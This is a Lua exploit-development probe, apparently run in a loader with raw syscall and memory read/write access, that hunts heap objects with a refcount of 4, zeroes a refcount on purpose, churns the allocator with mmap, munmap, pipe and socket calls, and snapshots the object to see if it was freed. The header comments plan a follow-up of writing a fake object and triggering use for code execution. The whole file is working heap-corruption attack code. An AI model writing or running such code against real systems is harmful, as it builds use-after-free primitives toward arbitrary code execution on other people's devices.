-- CRASH_CLASS: RISKY (intentional heap corruption)
-- PROBE 41h: refcount corruption test
-- From 41g: 24 refcount+ptr pairs, all rc=4, uniform slab at +0xBC0/CC0 offsets
-- Plan:
--   1. Locate a refcount=4 pair in adjacent heap
--   2. Snapshot the surrounding 128 bytes (for forensics)
--   3. Corrupt refcount: 4 -> 0
--   4. Trigger allocator activity (mmap/munmap churn)
--   5. Re-read the object: did it get freed/zeroed/reallocated?
--   6. If freed: write fake object, trigger use -> code execution
-- NOTE: this WILL likely crash the loader. We capture output before the crash.

print("=== PROBE 41h: REFCOUNT CORRUPTION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end

local function get_hi_lo(val)
    if type(val) == "table" and val.h then
        return val.h, val.l
    end
    return 0, to_num(val)
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end

local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end

local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end

--------------------------------------------------------------------
-- Step 1: Allocate anchor, find refcount target
--------------------------------------------------------------------
local base = do_mmap(PAGE)
if not base then
    print("mmap FAILED")
    return
end
print("anchor: " .. hex(base))

-- Find first refcount=4 + heap_ptr pair
local target_addr = nil
local target_rc_addr = nil
local target_ptr_addr = nil

for i = 1, 256 do
    local pg = base - i * 0x1000
    if pg <= 0 then break end
    local v = safe_rd(pg)
    if v == nil then break end
    if v == 0 then
        -- skip zero pages fast
    else
        for off = 0, 0xF00, 0x100 do
            local a = pg + off
            local q0 = safe_rq(a)
            local q1 = safe_rq(a + 8)
            if q0 and q1 then
                local h0, l0 = get_hi_lo(q0)
                local h1, l1 = get_hi_lo(q1)
                if h0 == 0 and l0 == 4 and h1 == 3 and l1 >= 0x10000000 then
                    target_addr = a
                    target_rc_addr = a
                    target_ptr_addr = a + 8
                    break
                end
            end
        end
    end
    if target_addr then break end
end

if not target_addr then
    print("NO refcount target found")
    pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
    return
end

print("target: " .. hex(target_addr))
print("")

--------------------------------------------------------------------
-- Step 2: Snapshot 128 bytes around the target
--------------------------------------------------------------------
print("--- SNAPSHOT (before corruption) ---")
local snapshot = {}
local snap_start = target_addr - 0x20
for off = 0, 0x78, 8 do
    local q = safe_rq(snap_start + off)
    if q then
        local rel = off - 0x20
        local tag = ""
        if snap_start + off == target_rc_addr then tag = " <-- REFCOUNT" end
        if snap_start + off == target_ptr_addr then tag = " <-- PTR" end
        local s = string.format("  [%+03X] %s%s", rel, dump_qword(q), tag)
        print(s)
        snapshot[off] = q
    end
end
print("")

-- Also read the object the ptr points to
local ptr_q = safe_rq(target_ptr_addr)
if ptr_q then
    local ph, pl = get_hi_lo(ptr_q)
    -- reconstruct full 64-bit addr: hi=3, lo=pl
    -- But we can only address 32-bit with memory.read_dword
    -- The ptr is 0x3_1xxxxxxx which is >32-bit, need uint64
    print("--- TARGET OBJECT (at ptr) ---")
    local ptr_full = ph * 0x100000000 + pl
    -- try reading via the numeric address
    for off = 0, 0x38, 8 do
        local q = safe_rq(uint64(ptr_full + off))
        if q then
            print(string.format("  [+%02X] %s", off, dump_qword(q)))
        else
            print(string.format("  [+%02X] FAULT", off))
            break
        end
    end
    print("")
end

--------------------------------------------------------------------
-- Step 3: Corrupt refcount 4 -> 0
--------------------------------------------------------------------
print("--- CORRUPTING REFCOUNT ---")
local orig_rc = safe_rd(target_rc_addr)
print("original rc: " .. hex(orig_rc))

local ok_w = safe_wd(target_rc_addr, 0)
if ok_w then
    local new_rc = safe_rd(target_rc_addr)
    print("after write: " .. hex(new_rc))
    if new_rc == 0 then
        print("REFCOUNT ZEROED")
    else
        print("write did not stick!")
    end
else
    print("WRITE FAILED")
    pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
    return
end
print("")

--------------------------------------------------------------------
-- Step 4: Trigger allocator activity to process the freed object
--------------------------------------------------------------------
print("--- TRIGGERING ALLOCATOR ---")

-- churn: alloc and free pages to kick the allocator
local churn_addrs = {}
for i = 1, 8 do
    local a = do_mmap(PAGE)
    if a then
        churn_addrs[#churn_addrs + 1] = a
        -- write something to force page fault / commit
        safe_wd(a, 0x42424242 + i)
    end
end
print("churn allocs: " .. #churn_addrs)

-- free them
for _, a in ipairs(churn_addrs) do
    pcall(function() sc_munmap(uint64(a), uint64(PAGE)) end)
end
print("churn freed")

-- also trigger some syscalls that might touch the allocator
local sys_pipe = make_syscall(42)  -- pipe
local pipe_buf = memory.alloc(16)
pcall(function() sys_pipe(pipe_buf) end)
local fd0 = safe_rd(pipe_buf)
local fd1 = safe_rd(pipe_buf + 4)
if fd0 and fd0 > 0 then
    local sys_close = make_syscall(6)
    pcall(function() sys_close(fd0) end)
    pcall(function() sys_close(fd1) end)
    print("pipe create+close done")
end

-- socket churn
local sys_socket = make_syscall(97)
local sys_close = make_syscall(6)
for i = 1, 4 do
    local ok_s, fd = pcall(function() return sys_socket(2, 1, 0) end)
    if ok_s then
        local fdn = to_num(fd)
        if fdn > 0 then
            pcall(function() sys_close(fdn) end)
        end
    end
end
print("socket churn done")
print("")

--------------------------------------------------------------------
-- Step 5: Re-read the corrupted object — what happened?
--------------------------------------------------------------------
print("--- POST-CORRUPTION SNAPSHOT ---")
local changed = 0
for off = 0, 0x78, 8 do
    local q = safe_rq(snap_start + off)
    if q then
        local rel = off - 0x20
        local tag = ""
        if snap_start + off == target_rc_addr then tag = " <-- RC" end
        if snap_start + off == target_ptr_addr then tag = " <-- PTR" end

        -- compare to snapshot
        local orig = snapshot[off]
        if orig then
            local oh, ol = get_hi_lo(orig)
            local nh, nl = get_hi_lo(q)
            if oh ~= nh or ol ~= nl then
                tag = tag .. " CHANGED!"
                changed = changed + 1
            end
        end
        print(string.format("  [%+03X] %s%s", rel, dump_qword(q), tag))
    end
end
print("")
print("changed qwords: " .. changed)

if changed > 0 then
    print("*** OBJECT STATE CHANGED AFTER RC CORRUPTION ***")
    -- check if rc is still 0 or was touched
    local final_rc = safe_rd(target_rc_addr)
    print("final rc: " .. hex(final_rc))
    if final_rc ~= 0 then
        print("RC was modified by allocator (possible free+realloc)")
    end
else
    print("object unchanged — free may be deferred or rc not checked yet")
    -- restore to avoid persistent corruption
    print("restoring original rc...")
    safe_wd(target_rc_addr, orig_rc)
    local restored = safe_rd(target_rc_addr)
    print("restored rc: " .. hex(restored))
end

print("")

-- Re-read the target object at the ptr
if ptr_q then
    local ph, pl = get_hi_lo(ptr_q)
    local ptr_full = ph * 0x100000000 + pl
    print("--- TARGET OBJECT (post-corruption) ---")
    for off = 0, 0x38, 8 do
        local q = safe_rq(uint64(ptr_full + off))
        if q then
            print(string.format("  [+%02X] %s", off, dump_qword(q)))
        else
            print(string.format("  [+%02X] FAULT (FREED?)", off))
            break
        end
    end
end

print("")
pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
print("=== PROBE 41h COMPLETE ===")
